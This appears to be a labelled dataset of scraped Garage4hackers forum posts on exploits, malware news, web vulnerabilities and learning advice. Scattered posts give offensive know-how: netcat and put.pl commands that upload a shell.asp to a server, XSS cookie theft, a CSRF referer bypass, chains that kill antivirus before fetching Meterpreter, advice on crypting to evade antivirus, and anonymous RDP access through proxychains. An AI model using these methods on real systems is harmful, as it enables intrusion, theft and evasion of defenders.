"[chain multiple file excution] File1[detects AV version] ---calls File2[kills detected AV]--calls-File3[dwnloads metepreter nd runs] No, this is not possible in the case of java applet execution. because in java applet execution every file is executed almost at the same time and files paths are hard coded in the applet {means we can't change on the fly or after execution}.. lets follow ur approach.. ok if you execute one file that detect the Av version how would you execute second file of your choice because everything is hard coded in the applet we can't change it on the fly..or after the execution.. [overall concept is that if you want to execute two or three files than you have to put all entries in the java applet] means if you execute one file that detect av version then how you select 2nd that is av specific because everything is hard coded... yes you can check your luck by executing directly the file that Kills the AV[just by guessing av version]. Although I am still on the learning curve and would take me some years to fully workout the ongoing discussions .. I read something that is closely (maybe..) related. The idea i read was to blend or chain bugs to form exploits. Often these little bugs from different vendors can be chained by different languages,methods etc. Here is the slide made by Billy Rios https://xs-sniper.com/blog/Blended-T...-It-Blend.pptx and the video he made to illustrate his slides http://www.youtube.com/watch?v=fMFVVNE8ytQ I have a hunch that the above can be used where you guys faced the problem of hardcoding...

The group was involved in hacking/defacing thousands of websites belonging to government, non-government and international organizations. It is believed the founder of Pakbugs \'Jawad Ehsan\', alias \'Humza\', remains at large and is believed to be based in Riyadh Saudi Arabia. But the co-founder \'Hassan Khan\' has been detained in the northwest Pakistani city of Peshawar, along with other members in Lahore, Bannu and Rawalpindi. It is believed that the arrest has been done mainly for hacking of Press Information Department (PID) (hxxp://www.pid.gov.pk) and Google Morocco (hxxp://www.google.com.ma). The hackers are also charged for credit card jacking and usage of stolen credit cards.  The involvement of these hackers in terrorism was ruled out and the men are just charged for electronic crimes. The statements said the arrested men have expertise in techniques Â Linux, SQL Injection, Trojan horses, Phishing, Rooting, Access to various servers, Botnets, PHP Scripts, Stealers, ASP scripts (self writing), JSP scripts (self writing), Key loggers and Credit Cards Jacking and usage of stolen Credit Cards. The arrests were done by Federal Investigation Agency (FIA) and senior officer \'Muhammad Idrees Mian\' gave this information to press.

"  I have seen developers relying on using HTTP referer header as a method of mitigating CSRF. One of the reason is that it is proposed in the OWASP <br>CSRF mitigation techniques. Even though the article clearly says that trusting reffer is not the right idea to mitigate this issue. <br>https:../www.owasp.org/index.php/Cros...Referer_Header. Also I have seen using orgin header to detect CSRF . <br> <br>Note: Http referer header would be removed when request is made from https site to http and vise verse. <br> <br>The following code checks whether HTTP_REFERER header is present , if present it will check if the current host equals refer host .If they both are not same then CSRF alert . Why mandate HTTP_REFERER header, because first GET request would never have referer . <br>ref <br> <br> <br> PHP Code: <br>if(isset($_SERVER[\'HTTP_REFERER\'], $_SERVER[\'HTTP_HOST\'])) if(parse_url($_SERVER[\'HTTP_REFERER\'], PHP_URL_HOST)!=$_SERVER[\'HTTP_HOST\']) exit(\'Anti-CSRF mechanism!\'); \r <br><br>So with the above I won\'t be able to directly iframe the page , since frame request would have parent referer headers. <br> <br>But this CSRF protection could be easily bypassed . The attacker only have to use any technique that would make him sent a request without referer header. <br> <br>All we need to do is load the iframe from data: uri.

We can send images as attachments to any user. By creating malicious image file and attaching it to mail attacker can exploit this vulnerability which can lead to complete compromise of account by stealing mail receiver cookies.  Gmail was not validating contents of uploaded image files which can lead to XSS by including java scripts in image files. Following are screen shots which demonstrates complete attack vector.           basically firstly this attack was limited for IE 6/7 but after some research i was able to bypass the IE8/9/10 protection which we presented in NullCon 2012. detail paper for same will be published soon here on g4h.","D4Garage4hackers","YES"

"d4rkpr1nc3, Shellcode is nothing but set of machine instructions which you normally write so that when you gain control over vulnerable program that program will redirect EIP to the shellcode(basically instructions written by author to do something) and then those instructions will get executed instead of actual program code. for eg. lets say your computer is having Winamp installed which is vulnerable. now did you seen any option in winamp to launce calc.exe?? NO but as the winamp is vulnerable, so what you can do is create exploit in which you will insert shellcode which is nothing but instructions to execute calc.exe so when you use this exploit what it will do is copy your shellcode somewhere in memory then control your program(winamp) and ask it to jump on a memory location where your shellcode is placed so once it take jump to your shellcode it get executed and you see calc.exe running on your computer. hope this cleared your doubt if not then feel free to ask your doubt again.","D4Garage4hackers","YES"

"  A week back, Citigroup had confirmed of a data breach that led to the disclosures of 200,00 customerÂs information. In a latest post at Help Net Security, the attack was made possible by the exploitation of a vulnerability simple vulnerability listed in OWASPÂs top 10 web application risks list. The flaw in question is called insecure direct object reference, and it happens when confidential information is exposed to users because developers did not have the good sense to hide it. In common language, the hack was made successful using simple URL manipulation !  Using this flaw, hackers were able to impersonate actual account holders by using a simple trick. After logging into a valid account, the URL to the Citi Account Online system contains a string of numbers which represents the customerÂs account. By changing this string, the criminals were able to easily switch between multiple accounts and obtain private customer information. Using a script to automate this process allowed them to do so hundreds of thousands of times. ÂOnce the attackers realized it Â IÂm guessing one of them probably had an account with Citigroup Â it was only a matter of writing a script that would feed random numbers into the URL and every time it successfully accessed an account, the attackers harvested the information contained in itÂ quoted the post on Help Net.

"  In computer security, heap spraying is a technique used in exploits to facilitate arbitrary code execution.The term is also used to describe the part of the source code of an exploit that implements this technique. In general, code that sprays the heap attempts to put a certain sequence of bytes at a predetermined location in the memory of a target process by having it allocate (large) blocks on the process\' heap and fill the bytes in these blocks with the right values. They commonly take advantage from the fact that these heap blocks will roughly be in the same location every time the heap spray is run. Execution flow can be redirected to the heap sprays via buffer overflow or heap overflow flaws.  Heap spray was widely used by chinese hackers while attacking google and various embassies of different countries. Earlier ""vinnu"" bro had explained about heap spray. Long time ago, I got a good tutorial from the internet over heap spray. So I thought of sharing it with all people. It will give beginners a very good approach towards heap spray and its implementation. The tutorial is bit long, so no chance of posting it here. I m just gonna share the link of the blog. Its a blog of an info-sec guy. A good one So enjoy guys. Feedbacks and comments are appreciated  http://grey-corner.blogspot.com/2010...-internet.html","D4Garage4hackers","YES"
"  Namaste <br> <br>The study of heap behaviors is another branch of computer science. You can write a full epic on it. <br> <br>The behavior that gives us a little control over the heap dynamically is that whenever you\'ll allocate a huge object and then destruct it, then the smaller object will be allocated at its place. This behavior is used in exploiting certain heap based bugs. <br> <br>We use this technique in heap spray to control the spray area...""vinnu""","D4Garage4hackers","NO"

"  Hello,  I wanted to ask for some help on how to find a variable inside a program using a disassembler like OllyDbg or Win32Dasm. I\'m trying to figure out how to manipulate that variable but my main problem is how to find it. I have little experience with disassemblers but somehow I managed to crack a few things over the years. Most of what I know by the basic tutorials that I\'ve read take the same approach, you check the program\'s string references and search the section that means something in relation to what you need to find, then you start following jumps and calls until you get to the spot that you want to manipulate, I\'ve done that on some occasions. The task at hand is a bit different from what I\'m used to, there are apparently no string references to the specific variable I need to find and so I don\'t know which way to go. I tried to follow the code but at some point I realized that even if I stepped on the code I was searching for I wouldn\'t know it. In more detail, it\'s a video game that upon launch checks if an external file is loaded, if that external file was loaded it displays an internal warning message (not your win32 popup) then exits. The game was built using a proprietary programming language based on Visual C++. I\'m guessing the source-code for that portion should be something like this:  Code: if (ExternalFileLoaded==1) { Display (""WARNING: An external file was loaded, bla, bla...""); Exit(0);}else{...continue...} Can someone give me a hint to which approach I should use to find that specific variable set or variable check?

Also, these ports and services are running.  PORT STATE SERVICE 443/tcp closed https 8083/tcp open us-srv  From 8083 port, I get that there is jboss installed.

"  Inguma is a penetration testing toolkit entirely written in python. The framework includes modules to discover hosts, gather information about, fuzz targets, brute force user names and passwords and, of course, exploits.    New Features added:-  - An icon has been added to graph nodes to show the OS of the target when available. - New autosave feature that will save the KB after every module execution to prevent data loss in case of GUI crash. This autosaved KB will be loaded at startup if the user wants. - Single host report option added to the node menu. - Improved performance of ping and scan modules. - More modules have been ported to the GUI, like ""identify""; wich has also been added to the list of modules launched on adding a target. - We are now closer to full Windows compatibility  Download: http://www.inguma-framework.org/projects/inguma/files","D4Garage4hackers","NO"
"  Script to upload file once u get W (write) access on Server  While pen-testing or hacking you may find some web directory to be writeable by world. Traditional method is using netcat and using PUT command       # nc -vv 127.0.0.1 80 ...... ........(some data in return from server) PUT /writeable_directory_u_found/your_text.txt HTTP/1.1 Host:http://127.0.0.1 Content-Length: 20 (press enter twice) (some responses from server) Now_write_your_text_here (again press enter twice)   .........................and so on... Look at google for exact syntax...m bit lazy now-a-days.  Ok, now to automate this stuff there are two scripts/tools in my knowledge First one is a script written by H.D. Moore a long back (b4 releasing Metasploit) and the Second one is a .exe tool  Checkout when using put.pl script by Moore, you need to edit the code a bit b\'coz it just takes the IP      e.g. # ./put.pl -h 127.0.0.1 -r shell.asp -l shell.asp -v   suppose the writeable directory is /admin. So we should supply ""-h 127.0.0.1/admin"". But it generates error b\'coz of the code checking. So edit the perl script according to your requirement.  Its available here: http://www.derkeiler.com/Mailing-Lis...0284/01-put.pl  And the tool is available here. Damn easy to use. It can upload and delete the remote file. Here is the link for tool ftp://ftp.idm.ru/libwww/Libwww_V5.4.0. file extension is exe. i.e. after 4.0 append .exe to it.","D4Garage4hackers","NO"

By the way this solution works with any cookie, not just the persistence ones. To you other question this feature is called ""cookie persistence"" and means you go to the same server you were initially load balanced to so changing the server data in the cookie is bad. The designer sent you to that server for a reason (maybe it contains your shopping cart). If you change the data the LTM will attempt to send you to the other server if that is a valid address but you will have an empty cart. If the designer wants to protect against this they would encrypt the cookie (it take checking a box).  for beginners, watch this presentation by Joe McCray (no affiliation with me, but the guy rocks)  https:../www.defcon.org/images/defcon...-Got-Owned.pdf https:../www.youtube.com/watch@v=tJsNu0VRKYY","D4Garage4hackers","NO"

"  Hello  I am looking to get into pen testing and have applied for a post where the hiring manager has asked me to have a go at a challenge as a pre-requisite for the interview. It\'s a role for a novice (which is what I most certainly am) where all training will be provided so I guess this is a test of resourcefulness. The challenge;  Set up a Windows 2000 machine and completely compromise it from another machine. No SPs installed. Complete compromise means getting a remote console as admin from another machine or some other remote control over administrator.  So far I have been unable to get a copy of Win 2K short notice but he did say I can do on XP. I have a copy of that with no SP. I have another XP machine and a Win 7 machine that can be used to compromise.  So can anyone offer guidance on how to go about this? I believe I will need to use a port scanner and find a way in that way but I\'ve really never done anything like this. Any help with this would be greatly appreciated as I really want a crack at this post.","D4Garage4hackers","NO"
"  Namaste <br>Nice explanation and quite informative. <br> <br>The only drawback with Blackhole exploitation kit is that it packs up all the bundled exploits into same file. Such practices should be avoided and it makes exploitation a little lazy in means of transportation overhead. moreover the signature of one bad fish (detected threat -' + '- exploit) can foil whole exploitation process and even zerodays or better ones will also be hammerred by av engines. <br> <br>The best way is to use a custom and ur own exploitation pack. They are not so difficult to make; just dont compare everything with metasploit, but a custom one could be more efficient and fast and undetectable and more portable and may include many features like ""anti-analysis payload changer engine"" etc according to the scenarios where even metasploit or blackhole or canvas etc doesnt fit. <br> <br>Hope in future we will post some articles on exploitation kit developments. <br> <br>...""vinnu""","D4Garage4hackers","NO"

"  Proxy is nothing but, like hiding your Identity. When you connect to internet, you obviously use one of the IP address assigned to you by your ISP (Internet Service Provider). When you connect to any service/server, you IP-Address is easily available for the Network monitoring device or security devices like, Firewalls/IDS/IPS. For hiding your orignal IP address (which is provided by your ISP), you use proxy IP address by using service provided by proxy servers around the globe.  As far as your question goes around Firefox.  For manually setting up proxy IP address under Firefox.  1. You could first get proxy servers IP address and its port used for proxy.  a) You can actually google for proxy server available.  b) I do like ""FreeProxyList"". 2. Under Firefox Menu Bar View Preferences/Options (under windows) Advance Network Tab settings check ""Manual Proxy configuration. And add your selected IP address and port number, you got from your proxy list website. Close and Confirm.  Most of the times I usually use ""wget"" command line program to crawl/get pages from websites. For configuring proxy for wget is quite easy.  You Just need to change the wgetrc file from /etc/ directory.  Changes are:  1. Un-comment the ""use_proxy=on""  2. un-comment and change ""proxy_http = http://proxy.yoyodyne.com"" to ""proxy_http = Your_selected_IP_Address:Port"" There are plenty of proxy ""extension/add-on\'s"" available, check them out as well.  3.Use proxychains. Just set up ""tor"" and install proxychains, and you are good to go like just start Firefox with proxychains.  1. proxychains firefox (starts Firefox with proxy settings)  I have just created a video to demonstrate all of the methods.

Tomorrow I am going for setting up the passive trap. It is as follows: 1. Trap wire no. 1 & 2 (Tx) and crimp it at no. 3 & 6 on a RJ-45 jack (so that it capture the traffic sent out from target machine). 2. Trap wire no. 3 & 6 (Rx) and crimp it on a separate cable\'s no. 3 & 6 RJ-45 jack (so that all incoming traffic for that machine could be captured). 3. Now two separate Ethernet cables are prepared. Insert them into two LAN ports of my machine. Team them (using some linux tool, I forgot the name) and use wireshark to get both outgoing & incoming packets.  But a situation: My laptop has only one LAN port. So I am planning to attach one trap cable to LAN port and another to my USB port (using an Ethernet to USB converter). Will that work???

"  Summary <br> <br>A Clickjacking vulnerability existed on Google Website Translator that allowed an attacker to add a translate editor by redressing the editor management page. <br> <br>Details <br> <br>Google Website Translator pages (a total of 5 pages) were lacking X-FRAME-OPTIONS HTTP headerfield or frame-busting measures to prevent framing of the pages. So the editor management page could be redressed to \'click-jack\' Google users. <br> <br> Code: Vulnerable Editor Management Page : http://translate.google.com/manager/editors  <br>Proof of Concept <br> <br> <br> <br>The redressed editor page with frame opacity set to 0 so it is invisible to the user. As soon as the user drags the matchstick into the cigarette and hits the result button, a new editor will be added to users\' Website Translator. <br> <br> <br> <br>With frame opacity set to 0.5 you can clearly see the redressed page and all the background stuffs. The matchstick is actually a text area that contains attacker\'s email address which is selected by default (JavaScript stuff),once the user drags the matchstick he will actually drag the email address into the invite email address area and when he will click the result, he will actually click the redressed invite button. <br> <br> <br> <br>Google addressed the vulnerability by adding X-FRAME-OPTIONS header field which is set to DENY on all pages <br> <br> <br> <br>Special Thanks to AMol NAik and Aditya Gupta ","D4Garage4hackers","NO"

"  Are you done with the certification exam? I did OSCP back last year in October, since then they\'ve changed a lot of things for PWK from what I\'ve heard.  Just some points: 1. If you\'re stuck at a machine in the labs, focus on recon and info gathering. Google each and everything you find, if you\'re not familiar with it already. 2. Pain, sufferance, humble & gh0st are the best machines! 3. If an exploit doesn\'t get you a shell, look at the errors and just don\'t give it up after a go, you might need to fix up the exploit a bit before it runs correctly. 4. Practice BOF\'s on other applications as well, you can lookup exploits and apps both on EDB. Corelan.be is a very good resource for learning. 5. There are multiple attack vectors for each machine, so if one is failing, look up other ways to exploit it. 6. Try to be as less dependent on Metasploit as you can.  Lastly, keep calm and enjoy the labs cause you\'re gonna miss it when it gets over.  Cheers!","D4Garage4hackers","NO"

"  DNS rebinding is a vulnerability in Web browsers and their plug-ins that can be exploited to circumvent firewalls or to temporarily hijack a client\'s IP address, effectively converting browsers into open network proxies. Users rely on their Web browsers to isolate sites they visit using the same origin policy: one site should be able to read and write data only from itself. DNS rebinding vulnerabilities permit an attacker to confuse a Web browser into aggregating a target server into his or her origin, allowing the attacker to communicate with that server through the browser.  These attacks work because browsers and plug-ins use DNS host names to distinguish between different origins, but browsers don\'t actually communicate with the hosts by name: they must first use DNS to resolve the host name to an IP address and then communicate with the host by its IP address. Consider a host name, such as attacker.com, that is first bound to the attacker\'s Web server. The attacker can load JavaScript, Flash, or other active content into the attacker.com origin in the browser. If the attacker then rebinds attacker.com to point to the target\'s Web server, that active content can now read and write on sockets to the target server.","D4Garage4hackers","YES"

"  Online criminals have evolved their tactics to harden their botnets against takedown using a variety of tactics, including fast-flux networks and Conficker-like dynamic domain generation. Yet, such tactics can also pinpoint when such networks are being created by bot operators, according to research from the Georgia Institute of Technology.  The research found that dynamically detecting changes in the domain name system (DNS) can lead to the early detection of botnets. When bot masters create the infrastructure for a botnet, the reputation of the domain names can tip off defenders. In two papers, one released last year (PDF) and one to be published in September, GATech researchers found that they can detect anomalies in the domain name system indicative of botnets and have documented recognition rates greater than 98 percent.  Monday, network security firm Damballa announced a service based on the research to provide intelligence on botnet-infected systems. Called FirstAlert, the service can detect the characteristic DNS queries indicative of botnet infections inside a customer\'s network.  Full Article","D4Garage4hackers","YES"

Stuxnet is a Windows-specific computer worm, first discovered in July 2010 by VirusBlokAda , a security firm based in Belarus, which has already affected more than 10,000 Indian systems, across power units and petrochemical plants, says leading internet security firm Symantec.  While it is not the first time that hackers have targeted industrial systems, it is the first discovered worm that spies on and reprograms industrial systems, and the first to include a programmable logic controller rootkit.  What\'s crucial is that having affected the controls, the virus can transfer the effective command of these installations to a remote location, mostly overseas.

"  Hello all, it recently came to my attention a command injection exploitation tool, which has the name commix ( 1 ) and by using it, it is very easy to find and exploit a command injection vulnerability in a certain vulnerable parameter or string.  Commix seems to be a great command injection tool which successfully exploits many vulnerable applications such as DVWA, bWAPP, ShelLOL, Persistence, Kioptrix(2014), w3af-moth etc.  I found references on that tool in many sites, like TrustedSec\'s Security Podcast Episode 6 ( 2 ) softpedia ( 3 ) and packetstormsecurity ( 4 ) and darknet.org.uk ( 5 ). As I noted recently it has been added to trustedsec\'s Penetration Testers Framework (PTF) ( 6 ). In the official github page ( 1 ), several exploitation examples ( 7 ), demos ( 8 ) and examples of combinatorial use of commix with other tools ( 9 ) (i.e metasploit and weevely) are posted .  ps: I\'ve already requested on BackBox Linux forum ( 10 )  ( 1 ) https://github.com/stasinopoulos/commix ( 2 ) https:../www.trustedsec.com/may-2015/...-6-show-notes/default.htm ( 3 ) http://news.softpedia.com/news/Commi...s-477728.shtml ( 4 ) http://packetstormsecurity.com/files...tion-Tool.html ( 5 ) http://www.darknet.org.uk/2015/04/co...n-attack-tool/ ( 6 ) https://github.com/trustedsec/ptf ( 7 ) https://github.com/stasinopoulos/com...Usage-Examples ( 8 ) https:../www.youtube.com/channel/UCFG...jdvyIiSy0mPI4A ( 9 ) https://github.com/stasinopoulos/com.../Upload-shells ( 10 ) https:../forum.backbox.org/tool-reque...oitation-tool/default.htm","D4Garage4hackers","YES"

"  Executive Overview:  Websense researchers have discovered the use of CVE-2014-0322 as early as January 20, 2014 - nearly 3 weeks before the previously known first date of the attacks  The attack may be targeting organizations associated with the French aerospace association, GIFAS  The CVE-2014-0322 exploit in this attack is hosted on a US server  We observed the malicious Shockwave Flash (Tope.swf SHA:910de05e0113c167ba3878f73c64d55e5a2aff9a) being uploaded to VirusTotal on January 20. This was presumably done by the attackers to confirm if antivirus had protection for the exploit. At the time there was zero detection.

"  Security experts at CSIS say that they have discovered the smallest online banking trojan yet. Called Tiny Banker (Tinba), the malware is just barely 20KB in size, including its configuration files.  Like Zeus, Tinba uses man-in-the-browser techniques and easily extendable configuration files to manipulate bank web sites via webinjects. Webinjects can be used, for example, to create additional fields for numerical single-use passwords that the attackers can then leverage to authorise fraudulent payments. Tinba can also uncover standard passwords and monitor network traffic.  Tinba is a bot in the classical sense; it uses an encoded connection to deliver data it has collected to a command and control server, which in turn gives the bot new orders. According to CSIS, Tinba has only been used on a very small number of banking web sites so far, but its modular structure means that the perpetrators should not have any problems adding other sites to that list.

"  Once the URL is added, we will invoke the function. As seen in the figure above, we have a button to invoke the function. Once finished, the application gives a message of successful operation.    We waited for a minute while the shell was being deployed on the server. After that, we accessed our deployed shell. W00t W00t ! We have our shell running on the server perfectly!    What surprised us was that we had a root privilege in the server using our shell    Conclusion : The JBoss default authentication vulnerability is like Christmas gift for attackers! Usually administrators take it lightly. But the aftermath can be fatal. An attacker can successfully gain control over the server using this bug and   * Root the server or tunnel it  * Get access to sensitive information  * Use the server to deploy malware  * Use the server in cyber crime campaigns Use the server to host malicious contents  * Compromise other machines connected to the server  And the possibility may go on!  What administrators need to do?   * Should try to avoid and should close remote access  * If remote access is enabled, a strong password should be applied  A small caution can save your organization\'s critical data and keep them safe.

This section is not only limited to Q&A and you can post your Browser POC, Analysis tricks, Analysis Script etc.  Rules:  1. Search on forum before posting query 2. Only browser fuzzing/crash related queries allowed in this section for other queries we have different section 3. Make sure you have used google before asking questions 4. Dont ask what is fuzzing? in this section 5. If you have solutions for others query kindly post it 6. be descriptive about your query 7. Dont ask i got crash now what? (question should be: I got crash in how to proceed further?) 8. We are here to just give direction, dont expect others to do complete crash analysis or fuzzer development for you as our goal is to make you understand & learn.   Enjoy...

"  Welll there are several ways, and there is no way!?. <br>It all depends upon ur own practices and the code. <br>In OllyDbg u can press CTRL+A for default system api calls and their arguments. but for custom functions, u can check the esp, ebp and other register\'s references. Moreover, u can also search backwards, by noting the first byte\'s address of the argument (after u found it by searching) and then setting a breakpoint on its access or checking for its references in .text section. But remember there can be dynamic calls(Virtual functions and virtual references) which gets calculated at the runtime. So better if u are learning or practicing the cracking it can be better done in XP as ASLR is no issue there. <br>The best OS in windows I\'ll recoment only win XP for this purpose and avoid win7 /8, until u become expert. <br> <br>""vinnu""","D4Garage4hackers","NO"

"  It\'s hard to say - if impossible at all - what language may be essential for your carrier. It totally depends... on your future job profile. Besides i can almost guarantee that you will not learn in university/college such things that will be needed by your future employer. So you are slightly over-estimating question importance. Also it can be that your future job will need a language that you didn\'t met in university ! So you must prepare to learn any language by yourself on behalf of employer requirements. So these things points to idea that you should be familiar enough with most languages which are taught in university. And finally, just my personal opinion,- you should know C language very well, because: 1. It is programming *classics*, which should know every educated developer. 2. It is most popular language. 3. There are most code examples on net written in C or JAVA (based on google code search) 4. Finally C (and C++) programs are fastest compared to other languages (except of course assembler), because they are *closer* to computer hardware than any other language is (yes, still assembler closer ). So, in my opinion make a VERY good start with C and later you will be able to branch to any required language.","D4Garage4hackers","NO"

There are client enquiries who ask me for the same flavour that Google is using... However, I need to know what are the consequences of using CPP for web app development? So far by word of mouth I have heard / discussion with developers ""while using php, asp, jsp, if compromised, you loose a site and possibly the server... but, when on direct cpp to c compiler, u dont loose website, you loose the entire server.... php jsp = sqli, csrf, etc... cpp = bof because, php goes via and works on diff OSI layer whereas CPP is quicker because, it has complete access to all resources"" is this understanding correct?

"  well buddy Anti viruses are not completely lamer they can detect php,asp shells as well.. . SO there is no big difference between traditional ""Download and execute"" and your ""Download and Deploy"" shellcode, all are download driven shellcode . Infact you are also executing your shell, the only difference is you are executing it from browser so antivirus will definitely flag it.. And if you want to change ur ASP shell to evade AV then i think we can also change EXE\'s to evade antiviruses.. another big problem with this shellcode is that its functionality is limited both from attacking point of view (only web server) to executing point of view (limited functionality by shells). <br> <br>The second point is where we use it means direct memory execution/injection or make exe and execute it independently (in POST exploitation). if the point is first means direct execution then why we use this means we can execute a cmd or meterpreter and then can transfer whatever we want and if the point is second means post exploitation then i think it is better to execute a executable or dll. <br> <br>So the success of download driven shellcodes is depends on antiviruse weaknesses. The one way you can beat them is the way of ""Injector"" believe me or not but the answer is ""Yes"" and another way is ""crypters/compressors"" for executables. <br> <br>can we use it with client side exploits ? <br> <br>P.S plz don\'t consider me offensive <br> <br> <br>thnx <br>DZZ","D4Garage4hackers","NO"

"There is a space between end of DOS stub and starting of PE header in a PE executable file. Would look garbage because it is undocumented(correct me if I am wrong) , but actually Microsoft had made it so for a specific purpose !! But the smart reverse engineers found out Lets see how .. It is a compiler specific thing. It is called Rich Signature. Strangely, it will only be generated by Microsoft's standard linkers. The dword after ""Rich"" is a key generated by the linker which repeats several times in the garbage data.When we compile a program the compiler puts the string ""@comp.id"" followed by a DWORD-sized compilerID number in our obj file. When we link our obj file the linker extracts the comp.id number and XORs it withthe key and writes it in the ""garbage"" as the 2nd DWORD before ""Rich"" Word was that Microsoft uses compiler ids to prove that a virus is made on a particular machine with a particular compiler. Proving that the person owning the computer is the virus writer !

Suppose you\'ve the credentials of Terminal Services for a remote windows server...off course you can connect directly, but this way your IP will get locked there....  So how can you evade this and connect to it anonymously ?  To proceed this...suppose yr shell is running on remote machine, it has RDP open but for internal LAN only, you don\'t have control over organizations firewall. Now would you be able to get RDP ?  ... I\'ve answers for these question for different scenarios...a request to members to give it a shot...hopefully we\'ll have some healthy discussion   OK,  Connecting to RDP anonymously is as simple as using TOR/proxies for it  Get to BT, open up your console and type  #proxychains rdesktop  Off course your Privoxy, Tor and proxychains need to be configured in advance.  To get better speed you can state just a single proxy IP in proxychains conf file instead of addressing TOR in that.  I tried it and its working fine, no trace in remote machines netstat.  Probably WiPu has another way of doing it...would like to listen from him...   And regarding the second scenario, instead of spoon feeding I\'ll tell you the prerequisites.  1. SSH Tunneling 2. plink.exe 3. port redirector/forwarder like fpipe.exe  3rd point is required if you want some intermediate machine for connection so that your IP would not be logged in target machine, otherwise point 1 and 2 are enough.  b0nd !!!","D4Garage4hackers","NO"

Reason: This is keeping in mind that a lot of members have busy schedule.We can decrease it afterward as per response. *Question should be categorized with 'Basic', ' Medium' and 'Tough' .

Reason: Of course we don't want answers to be seen below the posts ( within the time frame, i.e.) and lose an opportunity to try a hand ourselves *We have to come up with some round robin algorithm so that more members can put up a question.

"  Slowloris is a perl script written by RSnake which executes a Denial of Service Attack against Web Servers. This attack is performed at Layer 7 unlike the traditional Layer 4, DDoS attacks. There is no need for a Botnet in this case.  The script can be downloaded from here: http://ha.ckers.org/slowloris/slowloris.pl  It works, by sending partial HTTP Requests to the web server. It never sends the complete request, thereby blocking all the connections available to the Web Server.  Currently, there are a set of Web Servers which are known to be vulnerable to this type of Attack. You can find the complete list of vulnerable Web Servers on RSnake\'s site here: ha.ckers.org/slowloris/  I thought of testing it in my Lab.  Following was the setup used:  Ubuntu 11.04 running in a VM all the required perl libraries were installed on the VM.  Host OS: Windows 7 Home Premium, 64 bit. Firewall was disabled on the host.  Apache version 2.2.19 running on the Host OS.  I tried to perform a Denial of Service attack against the host OS, but for some reason it didn\'t work.  Sam Bowne has a complete set of instructions written in order to get this working, for me no success. Maybe, I will have to use a bigger html page instead of the default one which just displays the text, ""It Works!"".  You can find these instructions here: http://samsclass.info/seminars/DEFCO..._Slowloris.doc  Also, if you guys are aware of th3j3st33r who\'s busy attacking Jihadi Websites using his tool, XerXes, many hackers believe that his tool, XerXes, is a modified version of Slowloris with a frontend GUI.

Well from your description I am considering your aim is towards web app hacking more at this time so I will give info about test lab for checking your web app hacking knowledge.  To test your Web Vulnerabilities knowledge you can use some tools from foundstone like Hackme Bank, Hackme Casino, which can setup the Vulnerable Web Application in your test machine. Here are some tools which you can get from foundstone  Hacme Bank v2.0 Hacme BankÂ is designed to teach application developers, programmers, architects and security professionals how to create secure software.  Hacme BooksFoundstone Hacme Books is a learning platform for secure software development.  Hacme Casino v1.0Foundstone Hacme CasinoÂ is a learning platform for secure software development.  Hacme ShippingHacme Shipping is a web-based shipping application developed to demonstrate common web application hacking techniques.  Hacme TravelHacme Travel is designed to create secure software.  These tools come with the documentations also. So if you stuck exploiting and of the vulnerabilities the documentations help you with what kinda vulnerability is there in the application and how it can be exploited by an attacker.  My suggestion would be try to find out vulnerabilities in these web app yourself first then go on read the answers in the documentations.","D4Garage4hackers","NO"

"  ItÂs very irritating when weÂre infected with those sick local viruses. There is no exact way to remove it, but there are some tricks for you all that I wanna share. With these tricks, you can remove most of local viruses (my experience). They are :  Attrib (MS DOS Command)  This command let us change the virus file attribute. The most common usage of this command is for this file : autorun.inf located on the root of a hard drive. Usage : attrib autorun.inf -h -s -r. Before you delete the autorun.inf, make sure you note down the virus file name and location.  Create A New User Account  Why create a new user account? This will help you accessing some tools like DOS, Regedit, MsConfig, etc. In the newly create account, you can delete the virus using.  Way To Find Virus Filename  - In MsConfig, look for weird startup program names. - In the autorun.inf file, you might see the virus filename  - In startup folders  - In registry HKLMSoftwareMcftWindowsCurrentVersionRun; RunOnce; etc  - In registry (another location, IÂll post it once I found it Razz )  Some Places To Look For the Virus  - In Startup Folder  - In Windows Folder  - In System Folder  - In System32 Folder  - In Root of Hard Drives  RegTweaker This application can open registry access for you","D4Garage4hackers","NO"

For example: <br>if this forum well not this say, any other forum has xss vulnerability in it, then, u can post a quick javascript of document.cookie and header location it to ur phpfile.php or aspfile.asp ? and using get method, send information in it... <br>for example: get method is when things are displayed on URL like id=1 so ur server sided file will fetch it and store it in ur database... <br>now using modern browsers, u can replace ur existing cookie with the one that u have and open tht forum site, tadaaaaaaa u are in <br>however, these days, session cookies are used and these cookies expire when session ends (person logs out or browser closes) these values cannot be re-used...

"   Web Application Firewalls have become the new security solution for several businesses. Many companies often ignore the actual vulnerabilities and merely rely on the firewall for protection. Regrettably, most, if not all firewalls can be bypassed. In saying this, my post will demonstrate how to use some of SQLMap\'s new features to bypass WAFs/IDSs.  I have recently had the pleasure of working on a few tamper scripts for SQLMap, which can be found in the latest development version from the subversion repository.  svn checkout https://svn.sqlmap.org/sqlmap/trunk/sqlmap sqlmap-dev  The focus of the tamper scripts is to modify the request in a way that will evade the detection of the WAF (Web Application Firewall) rules. In some cases, you might need to combine a few tamper scripts together in order to fool the WAF. For a complete list of the tamper scripts, you can refer to https:../svn.sqlmap.org/sqlmap/trunk/sqlmap/tamper/default.htm  SOURCE","D4Garage4hackers","NO"

Otherwise the same origin policy will prevent the access to admin panel and we won\'t be able to get any data returned by sql injection. <br>2. Admin panel is package with know sqli bug and login page to this panel is well protected. <br>3. Cookies of admin panel are ""httpOnly"" which cannot be accessed by javascript. Otherwise if it\'s not, you can use classical cookie stealing with xss and compromise admin account. <br>4. SQL injection is error based. <br> <br>It works like this: <br>Attacker knows about xss in main site and sqli in admin panel. He crafts a xss payload with malicious javascript and sends it to Admin. When admin logged in into admin panel and clicks the payload, the sql injection is exploited and the returned data from the injection will be sent to attacker site which will typically has the username & password hashes for admin users. <br> <br>Thanks again for pointing me in this direction. <br> <br>AMol NAik","D4Garage4hackers","YES"

The demonstration will be showing how to hack into and control a batteryÂs microprocessor  Charlie Miller told Forbes News that ÂThese batteries just arenÂt designed with the idea that people will mess with them. What IÂm showing is that itÂs possible to use them to do something really bad.Â If the controller for the battery has been compromised it can be manipulated to the point where the battery is dead i.e. bricked. It might be possible to cause a fire or explosion by placing malware on the chip, although Miller hasnÂt put up these idea so far. Well, the demonstration next month will be interesting to watch. This research has shown the potential of hacking in any form. It will be interesting to see whether other batteries and laptops resemble the same vulnerability.  Source","D4Garage4hackers","YES"

